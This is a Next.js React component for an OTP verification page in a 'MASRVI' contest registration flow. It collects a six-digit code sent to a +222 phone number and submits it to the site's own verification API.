import { useState, useEffect } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter } from 'next/router';
import { useTranslation } from 'react-i18next';
import axios from 'axios';
import ErrorModal from '@/components/ErrorModal';
import { useContest } from '@/context/ContestContext';

export default function OtpPage() {
  const { t } = useTranslation();
  const router = useRouter();
  const { phone, entryCode, clearRegistration } = useContest();
  const [otpCode, setOtpCode] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  useEffect(() => {
    if (!phone || !entryCode) {
      router.replace('/register');
    }
  }, [phone, entryCode, router]);

  const handleOtpChange = (index, value) => {
    if (value.length > 1) return;
    const newOtp = [...otpCode];
    newOtp[index] = value.replace(/\D/g, '');
    setOtpCode(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !otpCode[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const code = otpCode.join('');
    if (code.length !== 6) return;

    setLoading(true);

    try {
      const { data } = await axios.post('/api/verify-otp', {
        phone,
        entryCode,
        otpCode: code,
      });

      if (data.success) {
        router.push('/share');
      } else {
        setShowError(true);
      }
    } catch {
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  const handleErrorClose = () => {
    setShowError(false);
    clearRegistration();
    router.push('/register');
  };

  // Show full phone number
  const fullPhone = phone ? `+222 ${phone}` : '';

  if (!phone || !entryCode) return null;

  return (
    <>
      <Head>
        <title>MASRVI - {t('otp.title')}</title>
      </Head>

      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100">
        {/* Back Button */}
        <div className="px-4 py-3 md:py-4">
          <Link
            href="/register"
            className="inline-flex items-center gap-2 text-gray-600 hover:text-primary-700 transition-colors text-sm md:text-base"
          >
            <span className="rtl:rotate-180">&#10094;</span>
            <span>{t('registration.back')}</span>
          </Link>
        </div>

        <div className="flex-1 flex items-center justify-center px-4 py-4 md:py-8">
          <div className="w-full max-w-md">
            <div className="glass-card rounded-2xl md:rounded-3xl p-6 md:p-8">
              {/* Logo */}
              <div className="text-center mb-6">
                <Image
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/5810143423896424381_120-1uDefD1vhhxaUyEWoZbKOogvt8VlOX.jpg"
                  alt="Masrvi Logo"
                  width={120}
                  height={48}
                  className="h-12 w-auto mx-auto mb-4 object-contain mix-blend-multiply"
                />
              </div>

              {/* Phone Icon */}
              <div className="text-center mb-6 md:mb-8">
                <div className="w-20 h-20 md:w-24 md:h-24 mx-auto mb-4 md:mb-6 rounded-full bg-gradient-to-br from-primary-100 to-primary-200 flex items-center justify-center">
                  <div className="w-14 h-14 md:w-16 md:h-16 rounded-full border-4 border-primary-400 flex items-center justify-center">
                    <svg className="w-7 h-7 md:w-8 md:h-8 text-primary-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                    </svg>
                  </div>
                </div>
                <h1 className="text-xl md:text-2xl font-bold text-gray-900 mb-2">{t('otp.title')}</h1>
                <p className="text-gray-600 mb-2 text-sm md:text-base">{t('otp.subtitle')}</p>
                <p className="text-primary-600 font-bold text-lg md:text-xl ltr-input">{fullPhone}</p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6 md:space-y-8">
                {/* OTP Input Boxes */}
                <div className="flex justify-center gap-2 md:gap-3" dir="ltr">
                  {otpCode.map((digit, index) => (
                    <input
                      key={index}
                      id={`otp-${index}`}
                      type="tel"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-10 h-12 md:w-12 md:h-14 text-center text-lg md:text-xl font-bold glass-input rounded-xl focus:outline-none transition"
                    />
                  ))}
                </div>

                <div className="space-y-3">
                  <button
                    type="submit"
                    disabled={loading || otpCode.join('').length !== 6}
                    className={`w-full py-4 md:py-5 text-white font-bold rounded-2xl transition-all shadow-lg text-base md:text-lg ${
                      otpCode.join('').length === 6
                        ? 'bg-primary-500 hover:bg-primary-600'
                        : 'bg-gray-400 cursor-not-allowed'
                    }`}
                  >
                    {loading ? '...' : t('otp.verify')}
                  </button>

                  <button
                    type="button"
                    onClick={() => router.push('/register')}
                    className="w-full py-4 md:py-5 glass-button text-gray-700 font-bold rounded-2xl hover:bg-white/90 transition-all text-base md:text-lg"
                  >
                    {t('otp.cancel')}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </main>

      <ErrorModal
        isOpen={showError}
        title={t('errors.title')}
        message={t('errors.invalid_otp')}
        buttonText={t('errors.retry')}
        onClose={handleErrorClose}
      />
    </>
  );
}
